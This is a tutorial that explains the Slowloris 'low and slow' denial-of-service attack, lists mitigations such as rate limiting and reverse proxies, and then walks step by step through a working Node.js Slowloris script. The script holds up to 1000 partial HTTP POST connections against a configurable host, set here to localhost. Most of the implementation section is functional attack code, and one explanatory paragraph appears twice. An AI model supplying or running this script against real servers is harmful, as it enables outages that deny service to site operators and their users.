What is a Slowloris DDoS attack?
-
Slowloris is a denial-of-service attack program which allows an attacker to overwhelm a targeted server by opening and maintaining many simultaneous HTTP connections between the attacker and the target.

<div align="center">
<img src="https://www.cloudflare.com/img/learning/ddos/ddos-slowloris-attack/slowloris-attack-diagram.png" width="500"/>
</div>


How does a Slowloris attack work?
--
Slowloris is an application layer attack which operates by utilizing partial HTTP requests. The attack functions by opening connections to a targeted Web server and then keeping those connections open as long as it can.

Slowloris is not a category of attack but is instead a specific attack tool designed to allow a single machine to take down a server without using a lot of bandwidth. Unlike bandwidth-consuming reflection-based DDoS attacks such as NTP amplification, this type of attack uses a low amount of bandwidth, and instead aims to use up server resources with requests that seem slower than normal but otherwise mimic regular traffic. It falls in the category of attacks known as “low and slow” attacks. The targeted server will only has so many threads available to handle concurrent connections. Each server thread will attempt to stay alive while waiting for the slow request to complete, which never occurs. When the server’s maximum possible connections has been exceeded, each additional connection will not be answered and denial-of-service will occur.

A Slowloris attack occurs in 4 steps:
--
* The attacker first opens multiple connections to the targeted server by sending multiple partial HTTP request headers.
* The target opens a thread for each incoming request, with the intent of closing the thread once the connection is completed. In order to be efficient, if a connection takes too long, the server will timeout the exceedingly long connection, freeing the thread up for the next request.
* To prevent the target from timing out the connections, the attacker periodically sends partial request headers to the target in order to keep the request alive. In essence saying, “I’m still here! I’m just slow, please wait for me.”
* The targeted server is never able to release any of the open partial connections while waiting for the termination of the request. Once all available threads are in use, the server will be unable to respond to additional requests made from regular traffic, resulting in denial-of-service.
The key behind a Slowloris is its ability to cause a lot of trouble with very little bandwidth consumption.

How is a Slowloris attack mitigated?
--
For Web servers that are vulnerable to Slowloris, there are ways to mitigate some of the impact. Mitigation options for vulnerable servers can be broken down into 3 general categories:

* Increase server availability - Increasing the maximum number of clients the server will allow at any one time will increase the number of connections the attacker must make before they can overload the server,. Realistically, an attacker may scale the number of attacks to overcome server capacity regardless of increases.
* Rate limit incoming requests - Restricting access based on certain usage factors will help mitigate a Slowloris attack. Techniques such as limiting the maximum number of connections a single IP address is allowed to make, restricting slow transfer speeds, and limiting the maximum time a client is allowed to stay connected are all approaches for limiting the effectiveness of low and slow attacks.
* Cloud-based protection - Use a service that can function as a reverse proxy, protecting the origin server.

Implementation
--
We start with some globals - net, which we use for the net library to establish and manage connections to the target server; maxConnections, which is our setting for how many simultaneous connections we want to maintain to the target; connections, which is an array to store and keep track of our active connections to the target, and host and port, which is the address and port we want the script to execute against. In our example, we're connecting to port 80 on localhost (127.0.0.1):
    
```javascript
    var net = require('net');

    var maxConnections	= 1000;
    var connections		= [];

    var host	= "127.0.0.1";
    var port	= 80;
```

Additionally, we'll have a property client which manages the connection itself. When we establish the connection we pass the target port and host, and a handler function which notifies us we're sending data and sends an incomplete POST payload. The important thing is that the Content-Length property is longer than the information we send, so the server is still expecting more data from us.
In a better version of this attack we may periodically send more data to the server to keep refreshing the timeout for this connection, but would avoid ever sending the complete request (or at least take as long as possible in doing so).

We'll also make a class for tracking and managing each connection. Our Connection class will take 2 arguments, h (host), and p (port), which the script will provide from our settings. We'll also set the properties, t (to keep track of time the connection is alive), and state (the current state of the connection: active if the connection is still working, otherwise ended or error).
```javascript
    function Connection(h, p){
	this.state	= 'active';
	this.t		= 0;

```
Additionally, we'll have a property client which manages the connection itself. When we establish the connection we pass the target port and host, and a handler function which notifies us we're sending data and sends an incomplete POST payload. The important thing is that the Content-Length property is longer than the information we send, so the server is still expecting more data from us.
In a better version of this attack we may periodically send more data to the server to keep refreshing the timeout for this connection, but would avoid ever sending the complete request (or at least take as long as possible in doing so).
	
```javascript
	this.client = net.connect({port:p, host:h}, () => {
		process.stdout.write("Connected, Sending... ");
		
		this.client.write("POST / HTTP/1.1\r\nHost: "+host+"\r\n" +
			"Content-Type: application/x-www-form-urlenconded\r\n" +
			"Content-Length: 385\r\n\r\nvx=321&d1=fire&l");
		
		process.stdout.write("Written.\n");
    });
    
```

We also want to handle some events for the connection. Firstly, if the target sends us any data back, it's not listening to us anymore. We'll show how much information was received and end this connection:
```javascript
	
	this.client.on('data', (data) => {
		console.log("\t-Received "+data.length+" bytes...");
		this.client.end();
	});
```
Now to handle the end event, firstly calculating the time this connection was alive, and also changing the state of the Connection object to ended, so we know we don't need it anymore.
```javascript

	this.client.on('end', () => {
		var d = Date.now() - this.t;
		this.state = 'ended';
```

We'll also show the time the connection was alive and how many connections remain open

```javascript

			console.log("\t-Disconnected (duration: " +
			(d/1000).toFixed(3) +
			" seconds, remaining open: " +
			connections.length +
			").");
	});
```

We'll also add a handler for the error event; if an error occurs, we simply want to change the Connection state to error, so we know it can be removed:
```javascript
	this.client.on('error', () => {
		this.state = 'error';
	});
```
Finally, we add the Connection to our connections array, and the object method is complete.
```javascript
	connections.push(this);
```
Managing all the connections

To establish and track the connections, we'll set up an interval to run twice a second; it'll start with a flag (notify) that lets us know if we want to show output this iteration.
```javascript

     setInterval(() => {
        var notify = false;
```
If we haven't reached our maxConnections connection limit, we create a new Connection and change our notify flag so we'll show output:

```javascript
	if(connections.length < maxConnections)
	{
		new Connection(host, port);
		notify = true;
	}
```

We'll also clear the connections array of any Connection objects that are not active.

```javascript

	connections = connections.filter(function(v) {
		return v.state=='active';
	});
```

Finally, if the notify flag is set we'll show how many active connections we currently have, and close the interval function, as well as specifying the interval repetition rate (500 milliseconds).

```javascript
	if(notify)
	{
		console.log("Active connections: " + connections.length +
			" / " + maxConnections);
	}
    }, 500);
```
